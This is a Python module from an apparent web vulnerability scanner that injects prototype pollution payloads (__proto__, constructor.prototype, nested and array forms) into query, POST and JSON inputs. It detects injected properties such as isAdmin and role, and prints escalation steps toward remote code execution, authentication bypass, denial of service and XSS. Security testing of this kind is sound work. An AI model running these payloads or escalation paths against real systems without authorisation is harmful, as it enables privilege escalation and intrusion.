"""Prototype Pollution module for automated testing

This module implements:
- JSON payload injection with __proto__ and constructor.prototype
- Verification by detecting unexpected properties
- Testing multiple injection points (query, POST, headers)
- Escalation guidance for RCE and authentication bypass
"""

import json
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.payload_engine import PayloadEngine


class PollutionTechnique(Enum):
    """Prototype pollution testing techniques"""
    
    PROTO_PROPERTY = "__proto__"  # __proto__ property injection
    CONSTRUCTOR_PROTOTYPE = "constructor.prototype"  # constructor.prototype injection
    PROTO_ARRAY = "__proto__[]"  # Array-based __proto__ injection
    NESTED_PROTO = "nested__proto__"  # Nested object __proto__ injection


class InjectionLocation(Enum):
    """Injection point locations"""
    
    QUERY = "query"  # Query parameters
    POST = "post"  # POST body parameters
    JSON_BODY = "json_body"  # JSON request body
    HEADER = "header"  # HTTP headers
    COOKIE = "cookie"  # Cookies


@dataclass
class InjectionPoint:
    """Represents a potential prototype pollution injection point"""
    
    parameter: str
    location: InjectionLocation
    original_value: str
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    data: Optional[Dict[str, str]] = None
    json_data: Optional[Dict] = None
    body: Optional[str] = None


@dataclass
class PrototypePollutionResult:
    """Result of prototype pollution testing"""
    
    injection_point: InjectionPoint
    is_vulnerable: bool
    technique: Optional[PollutionTechnique] = None
    polluted_property: Optional[str] = None
    payload: Optional[Dict] = None
    confidence: float = 0.0
    output: Optional[str] = None
    evidence: List[str] = field(default_factory=list)
    escalation_paths: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


class PrototypePollutionTester:
    """Prototype pollution detection and exploitation"""
    
    # Test property names to inject
    TEST_PROPERTIES = [
        "polluted",
        "isAdmin",
        "isAuthenticated",
        "role",
        "admin",
        "authenticated",
        "testProperty",
        "vulnchain_test",
    ]
    
    # Pollution payloads for different techniques
    POLLUTION_PAYLOADS = {
        PollutionTechnique.PROTO_PROPERTY: [
            # Basic __proto__ pollution
            {"__proto__": {"polluted": "yes"}},
            {"__proto__": {"isAdmin": True}},
            {"__proto__": {"role": "admin"}},
            {"__proto__": {"authenticated": True}},
            # Nested pollution
            {"user": {"__proto__": {"isAdmin": True}}},
            {"data": {"__proto__": {"role": "admin"}}},
        ],
        PollutionTechnique.CONSTRUCTOR_PROTOTYPE: [
            # constructor.prototype pollution
            {"constructor": {"prototype": {"polluted": "yes"}}},
            {"constructor": {"prototype": {"isAdmin": True}}},
            {"constructor": {"prototype": {"role": "admin"}}},
        ],
        PollutionTechnique.PROTO_ARRAY: [
            # Array-based pollution
            {"__proto__[polluted]": "yes"},
            {"__proto__[isAdmin]": "true"},
            {"__proto__[role]": "admin"},
        ],
        PollutionTechnique.NESTED_PROTO: [
            # Deeply nested pollution
            {"a": {"b": {"__proto__": {"polluted": "yes"}}}},
            {"settings": {"config": {"__proto__": {"isAdmin": True}}}},
        ],
    }
    
    # Detection patterns in responses
    POLLUTION_INDICATORS = [
        # Property appears in response
        r'"polluted"\s*:\s*"yes"',
        r'"isAdmin"\s*:\s*true',
        r'"role"\s*:\s*"admin"',
        r'"authenticated"\s*:\s*true',
        r'polluted:\s*yes',
        r'isAdmin:\s*true',
        r'role:\s*admin',
        # JavaScript object indicators
        r'Object\.prototype\.polluted',
        r'Object\.prototype\.isAdmin',
        # Error messages revealing pollution
        r'Cannot set property.*of.*prototype',
        r'__proto__.*is not allowed',
        r'prototype pollution detected',
    ]
    
    # Escalation guidance
    ESCALATION_PATHS = {
        "rce": [
            "If the application uses child_process.spawn() or similar, pollute 'shell' property to enable command injection",
            "Pollute 'env' property to inject environment variables that may be executed",
            "Target template engines by polluting properties used in template rendering",
            "Pollute 'NODE_OPTIONS' or similar to inject malicious code during process spawning",
        ],
        "auth_bypass": [
            "Pollute 'isAdmin', 'role', or 'authenticated' properties to bypass authorization checks",
            "Target session properties like 'userId', 'username', or 'permissions'",
            "Pollute JWT claim properties if the application merges objects with tokens",
            "Inject properties that override authentication middleware checks",
        ],
        "dos": [
            "Pollute 'toString' or 'valueOf' to cause application crashes",
            "Target 'constructor' property to break object instantiation",
            "Pollute array methods to cause infinite loops or memory exhaustion",
        ],
        "xss": [
            "Pollute properties used in HTML rendering without sanitization",
            "Target 'innerHTML', 'outerHTML', or similar DOM properties",
            "Inject script tags or event handlers through polluted properties",
        ],
    }

    def __init__(
        self,
        request_handler: RequestHandler,
        payload_engine: Optional[PayloadEngine] = None,
    ):
        """Initialize prototype pollution tester
        
        Args:
            request_handler: Request handler for HTTP communication
            payload_engine: Optional payload engine for wordlists
        """
        self.request_handler = request_handler
        self.payload_engine = payload_engine or PayloadEngine()
        self._load_default_payloads()
    
    def _load_default_payloads(self):
        """Load default prototype pollution payloads"""
        for technique, payloads in self.POLLUTION_PAYLOADS.items():
            for payload in payloads:
                self.payload_engine.add_custom_payload(
                    json.dumps(payload),
                    f"prototype_pollution_{technique.value}"
                )
    
    async def test_injection_point(
        self,
        injection_point: InjectionPoint,
        techniques: Optional[List[PollutionTechnique]] = None,
    ) -> List[PrototypePollutionResult]:
        """Test an injection point for prototype pollution
        
        Args:
            injection_point: The injection point to test
            techniques: List of techniques to use (default: all)
        
        Returns:
            List of prototype pollution results
        """
        if techniques is None:
            techniques = list(PollutionTechnique)
        
        results = []
        
        # Get baseline response
        baseline_response = await self._send_request(injection_point, None)
        baseline_text = baseline_response.text
        
        # Test each technique
        for technique in techniques:
            payloads = self.POLLUTION_PAYLOADS.get(technique, [])
            
            for payload in payloads:
                result = await self._test_payload(
                    injection_point,
                    payload,
                    technique,
                    baseline_text,
                )
                
                if result:
                    results.append(result)
                    
                    # If we found a vulnerability, we can stop testing this technique
                    if result.is_vulnerable:
                        break
        
        return results
    
    async def _test_payload(
        self,
        injection_point: InjectionPoint,
        payload: Dict,
        technique: PollutionTechnique,
        baseline_text: str,
    ) -> PrototypePollutionResult:
        """Test a specific payload
        
        Args:
            injection_point: The injection point
            payload: The pollution payload
            technique: The technique being used
            baseline_text: Baseline response text
        
        Returns:
            PrototypePollutionResult
        """
        # Send request with pollution payload
        response = await self._send_request(injection_point, payload)
        response_text = response.text
        
        # Check for pollution indicators
        is_polluted, polluted_property = self._detect_pollution(
            payload,
            response_text,
            baseline_text,
        )
        
        if is_polluted:
            # Generate escalation guidance
            escalation_paths = self._generate_escalation_guidance(
                injection_point,
                polluted_property,
            )
            
            return PrototypePollutionResult(
                injection_point=injection_point,
                is_vulnerable=True,
                technique=technique,
                polluted_property=polluted_property,
                payload=payload,
                confidence=0.90,
                output=response_text[:500],
                evidence=[
                    f"Prototype pollution detected: {technique.value}",
                    f"Polluted property: {polluted_property}",
                    f"Payload: {json.dumps(payload)}",
                    f"Property appears in response",
                    f"Injection point: {injection_point.parameter} ({injection_point.location.value})",
                ],
                escalation_paths=escalation_paths,
                metadata={
                    "response_status": response.status_code,
                    "response_length": len(response_text),
                },
            )
        
        # No pollution detected
        return PrototypePollutionResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=technique,
            payload=payload,
            confidence=0.0,
        )
    
    async def _send_request(
        self,
        injection_point: InjectionPoint,
        pollution_payload: Optional[Dict],
    ) -> Response:
        """Send request with pollution payload
        
        Args:
            injection_point: The injection point
            pollution_payload: The pollution payload (None for baseline)
        
        Returns:
            Response object
        """
        # Prepare request parameters based on injection location
        if injection_point.location == InjectionLocation.JSON_BODY:
            # JSON body injection
            json_data = injection_point.json_data.copy() if injection_point.json_data else {}
            
            if pollution_payload:
                # Merge pollution payload into JSON body
                json_data = self._merge_payloads(json_data, pollution_payload)
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                json=json_data,
            )
        
        elif injection_point.location == InjectionLocation.POST:
            # POST parameter injection
            data = injection_point.data.copy() if injection_point.data else {}
            
            if pollution_payload:
                # Convert pollution payload to POST parameters
                flat_payload = self._flatten_payload(pollution_payload)
                data.update(flat_payload)
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                data=data,
            )
        
        elif injection_point.location == InjectionLocation.QUERY:
            # Query parameter injection
            from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
            
            parsed = urlparse(injection_point.url)
            params = parse_qs(parsed.query)
            
            if pollution_payload:
                # Convert pollution payload to query parameters
                flat_payload = self._flatten_payload(pollution_payload)
                for key, value in flat_payload.items():
                    params[key] = [value]
            
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=new_url,
                headers=injection_point.headers,
            )
        
        else:
            # Default: send as-is
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                data=injection_point.data,
            )
    
    def _merge_payloads(self, base: Dict, pollution: Dict) -> Dict:
        """Merge pollution payload into base payload
        
        Args:
            base: Base payload
            pollution: Pollution payload
        
        Returns:
            Merged payload
        """
        result = base.copy()
        
        for key, value in pollution.items():
            if isinstance(value, dict) and key in result and isinstance(result[key], dict):
                # Recursively merge nested dicts
                result[key] = self._merge_payloads(result[key], value)
            else:
                # Direct assignment
                result[key] = value
        
        return result
    
    def _flatten_payload(self, payload: Dict, prefix: str = "") -> Dict[str, str]:
        """Flatten nested payload for query/POST parameters
        
        Args:
            payload: Nested payload
            prefix: Key prefix for nested keys
        
        Returns:
            Flattened payload
        """
        result = {}
        
        for key, value in payload.items():
            full_key = f"{prefix}{key}" if prefix else key
            
            if isinstance(value, dict):
                # Recursively flatten nested dicts
                nested = self._flatten_payload(value, f"{full_key}.")
                result.update(nested)
            elif isinstance(value, bool):
                # Convert boolean to string
                result[full_key] = "true" if value else "false"
            else:
                # Direct assignment
                result[full_key] = str(value)
        
        return result
    
    def _detect_pollution(
        self,
        payload: Dict,
        response_text: str,
        baseline_text: str,
    ) -> Tuple[bool, Optional[str]]:
        """Detect prototype pollution in response
        
        Args:
            payload: The injected payload
            response_text: Response text to analyze
            baseline_text: Baseline response text
        
        Returns:
            Tuple of (is_polluted, polluted_property)
        """
        # Extract polluted properties from payload
        polluted_properties = self._extract_polluted_properties(payload)
        
        # Check if any polluted property appears in response
        for prop_name, prop_value in polluted_properties.items():
            # Check for property in JSON format
            json_patterns = [
                f'"{prop_name}"\\s*:\\s*"{prop_value}"',
                f'"{prop_name}"\\s*:\\s*{prop_value}',
                f"'{prop_name}'\\s*:\\s*'{prop_value}'",
                f"'{prop_name}'\\s*:\\s*{prop_value}",
            ]
            
            for pattern in json_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    # Check if this pattern was NOT in baseline
                    if not re.search(pattern, baseline_text, re.IGNORECASE):
                        return True, prop_name
            
            # Check for property in JavaScript object format
            js_patterns = [
                f"{prop_name}\\s*:\\s*'{prop_value}'",
                f"{prop_name}\\s*:\\s*\"{prop_value}\"",
                f"{prop_name}\\s*:\\s*{prop_value}",
            ]
            
            for pattern in js_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    if not re.search(pattern, baseline_text, re.IGNORECASE):
                        return True, prop_name
            
            # Check for property in HTML/text format
            text_patterns = [
                f"{prop_name}.*{prop_value}",
                f"property.*{prop_name}",
            ]
            
            for pattern in text_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    if not re.search(pattern, baseline_text, re.IGNORECASE):
                        return True, prop_name
        
        # Check for general pollution indicators
        for indicator in self.POLLUTION_INDICATORS:
            if re.search(indicator, response_text, re.IGNORECASE):
                if not re.search(indicator, baseline_text, re.IGNORECASE):
                    # Found pollution indicator
                    # Try to extract property name from indicator
                    match = re.search(r'(polluted|isAdmin|role|authenticated)', indicator, re.IGNORECASE)
                    if match:
                        return True, match.group(1)
                    return True, "unknown"
        
        return False, None
    
    def _extract_polluted_properties(self, payload: Dict, prefix: str = "") -> Dict[str, str]:
        """Extract polluted properties from payload
        
        Args:
            payload: The pollution payload
            prefix: Key prefix for nested keys
        
        Returns:
            Dictionary of property names to values
        """
        properties = {}
        
        for key, value in payload.items():
            # Skip __proto__ and constructor keys themselves
            if key in ["__proto__", "constructor", "prototype"]:
                if isinstance(value, dict):
                    # Recursively extract from nested dict
                    nested = self._extract_polluted_properties(value, prefix)
                    properties.update(nested)
                continue
            
            full_key = f"{prefix}{key}" if prefix else key
            
            if isinstance(value, dict):
                # Recursively extract from nested dict
                nested = self._extract_polluted_properties(value, f"{full_key}.")
                properties.update(nested)
            else:
                # This is a polluted property
                properties[full_key] = str(value)
        
        return properties
    
    def _generate_escalation_guidance(
        self,
        injection_point: InjectionPoint,
        polluted_property: Optional[str],
    ) -> List[str]:
        """Generate escalation guidance for the vulnerability
        
        Args:
            injection_point: The vulnerable injection point
            polluted_property: The polluted property name
        
        Returns:
            List of escalation guidance strings
        """
        guidance = []
        
        # Add general guidance
        guidance.append("## Prototype Pollution Escalation Paths")
        guidance.append("")
        guidance.append(f"Successfully polluted property: {polluted_property}")
        guidance.append(f"Injection point: {injection_point.parameter} ({injection_point.location.value})")
        guidance.append("")
        
        # Add RCE guidance
        guidance.append("### Remote Code Execution (RCE)")
        for path in self.ESCALATION_PATHS["rce"]:
            guidance.append(f"- {path}")
        guidance.append("")
        
        # Add authentication bypass guidance
        guidance.append("### Authentication Bypass")
        for path in self.ESCALATION_PATHS["auth_bypass"]:
            guidance.append(f"- {path}")
        guidance.append("")
        
        # Add DoS guidance
        guidance.append("### Denial of Service (DoS)")
        for path in self.ESCALATION_PATHS["dos"]:
            guidance.append(f"- {path}")
        guidance.append("")
        
        # Add XSS guidance
        guidance.append("### Cross-Site Scripting (XSS)")
        for path in self.ESCALATION_PATHS["xss"]:
            guidance.append(f"- {path}")
        guidance.append("")
        
        # Add specific guidance based on polluted property
        if polluted_property:
            guidance.append("### Specific Recommendations")
            
            if "admin" in polluted_property.lower() or "auth" in polluted_property.lower():
                guidance.append("- The polluted property appears to be authentication-related")
                guidance.append("- Try accessing admin endpoints or privileged functionality")
                guidance.append("- Test if the pollution persists across requests")
            
            if "role" in polluted_property.lower():
                guidance.append("- The polluted property appears to be role-based")
                guidance.append("- Try different role values: 'admin', 'superuser', 'root'")
                guidance.append("- Test role-based access control bypasses")
            
            guidance.append("")
        
        # Add testing recommendations
        guidance.append("### Testing Recommendations")
        guidance.append("- Verify pollution persists across multiple requests")
        guidance.append("- Test different injection points (query, POST, JSON)")
        guidance.append("- Try nested pollution for deeper object structures")
        guidance.append("- Monitor application behavior for unexpected side effects")
        guidance.append("- Check if pollution affects other users (stored pollution)")
        
        return guidance


def create_injection_points_from_request(
    url: str,
    method: str = "GET",
    query_params: Optional[Dict[str, str]] = None,
    post_data: Optional[Dict[str, str]] = None,
    json_data: Optional[Dict] = None,
    headers: Optional[Dict[str, str]] = None,
) -> List[InjectionPoint]:
    """Create injection points from a request
    
    Args:
        url: Target URL
        method: HTTP method
        query_params: Query parameters
        post_data: POST data
        json_data: JSON data
        headers: HTTP headers
    
    Returns:
        List of injection points
    """
    injection_points = []
    
    # Query parameter injection points
    if query_params:
        for param_name, param_value in query_params.items():
            injection_points.append(InjectionPoint(
                parameter=param_name,
                location=InjectionLocation.QUERY,
                original_value=param_value,
                url=url,
                method=method,
                headers=headers or {},
            ))
    
    # POST parameter injection points
    if post_data:
        for param_name, param_value in post_data.items():
            injection_points.append(InjectionPoint(
                parameter=param_name,
                location=InjectionLocation.POST,
                original_value=param_value,
                url=url,
                method=method,
                headers=headers or {},
                data=post_data,
            ))
    
    # JSON body injection point
    if json_data:
        injection_points.append(InjectionPoint(
            parameter="json_body",
            location=InjectionLocation.JSON_BODY,
            original_value=json.dumps(json_data),
            url=url,
            method=method,
            headers=headers or {},
            json_data=json_data,
        ))
    
    return injection_points
